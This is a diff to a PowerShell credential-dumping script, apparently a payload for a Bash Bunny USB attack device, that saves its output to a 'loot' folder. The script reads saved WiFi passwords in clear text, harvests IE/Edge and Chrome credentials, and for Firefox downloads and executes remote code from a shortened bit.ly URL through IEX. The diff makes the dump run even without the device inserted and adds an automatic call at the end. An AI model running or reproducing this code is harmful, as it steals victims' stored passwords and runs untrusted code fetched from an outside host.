@@ -1,6 +1,6 @@
 ﻿
 
-# _main_ -LOOTDIR "\loot\CredDump" -APPEND "false"
+
 
 #################### MAIN ##########################
 function _main_
@@ -28,13 +28,13 @@ param(
             Get-Creds |Out-File $OUT
         }
     } else {
-        echo "No Bunny insert"
-        exit
+        Write-Output "No Bunny insert"
+        Get-Creds
     }
 
 # OK We are ready .... creeate LED File in $LOOTDIR - bash bunny is waiting for it
 
-#  echo "R B 200" |out-file "$Bunny\$LOOTDIR\LED.TXT"
+#  Write-Output "R B 200" |out-file "$Bunny\$LOOTDIR\LED.TXT"
 
 }
 
@@ -48,39 +48,39 @@ function Get-Creds {
 # Windows Informationen
 
 
-    echo "##Computer Info"
-    echo "======================================================"
-    echo ""
+    Write-output "##Computer Info"
+    Write-Output "======================================================"
+    Write-Output ""
     $sServer = "."
     $sOS =Get-WmiObject -class Win32_OperatingSystem -computername $sServer
     $sOS | Select-Object Description, Caption, OSArchitecture, BuildNumber | Format-List
-    echo ""
+    Write-Output ""
     Get-ChildItem env: |sort name
-    echo ""
-    echo ""
+    Write-Output ""
+    Write-Output ""
 
-    echo "##WiFi Info"
-    echo "======================================================"
-    echo ""
+    Write-Output "##WiFi Info"
+    Write-Output "======================================================"
+    Write-Output ""
     Get-WiFiCreds
     
-    echo ""
-    echo "##IE / Edge"
-    echo "======================================================"
-    echo ""
+    Write-Output ""
+    Write-Output "##IE / Edge"
+    Write-Output "======================================================"
+    Write-Output ""
     Get-IECreds
 
-    echo ""
-    echo ""
-    echo "##Chrome"
-    echo "======================================================"
-    echo ""
+    Write-Output ""
+    Write-Output ""
+    Write-Output "##Chrome"
+    Write-Output "======================================================"
+    Write-Output ""
     Get-ChromeCreds
 
-    echo ""
-    echo ""
-    echo "##FireFox"
-    echo "======================================================"
+    Write-Output ""
+    Write-Output ""
+    Write-Output "##FireFox"
+    Write-Output "======================================================"
     $powershellx86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
     & $powershellx86 -command "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2not5sV'); Get-FoxDump"
 }
@@ -90,16 +90,18 @@ function Get-Creds {
 
 
 function Get-WiFiCreds {
-    echo "SSID `t`t`t`t AuthType `t`t Password"
-    echo "======================================================================"
+
     $WLAN = netsh wlan show profiles | Select-String ": (.*)" |% { $_.Matches.Groups[1].Value }
 
     foreach ( $SSID in $WLAN ) {
 	    $Network = netsh wlan show profiles name=$SSID key=clear
-	    $AuthType = (($Network | Select-String "Authentifizierung") -split(": "))[1]
-        $Password = (($Network | select-string "sselinhalt") -split(": "))[1]	
-	    echo "$SSID `t`t $AuthType `t`t $Password"
-	
+	    $AuthType = (($Network | Select-String "Authentifizierung") -split(": "))[1] # set according to you language
+        $Password = (($Network | select-string "sselinhalt") -split(": "))[1]	     # in us its Authentication
+	    $obj=New-Object PSObject
+        $obj | Add-Member NoteProperty SSID($SSID)
+        $obj | Add-Member NoteProperty Authentication($AuthType)
+        $obj | Add-Member NoteProperty Password($Password)
+        Write-Output $obj -
     }
 }
 
@@ -186,3 +188,4 @@ function Get-ChromeCreds() {
 }
 
 
+ _main_ -LOOTDIR "\loot\DumpCreds" -APPEND "false"
